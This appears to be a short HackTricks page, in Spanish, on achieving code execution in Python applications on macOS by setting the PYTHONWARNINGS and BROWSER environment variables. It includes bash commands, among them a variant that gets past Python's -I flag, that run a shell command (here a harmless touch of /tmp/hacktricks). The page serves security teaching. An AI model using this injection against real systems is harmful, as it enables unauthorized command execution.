# Inyección de Aplicaciones Python en macOS

{{#include ../../../banners/hacktricks-training.md}}

## A través de las variables de entorno `PYTHONWARNINGS` y `BROWSER`

Es posible alterar ambas variables de entorno para ejecutar código arbitrario cada vez que se llama a python, por ejemplo:
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
{{#include ../../../banners/hacktricks-training.md}}
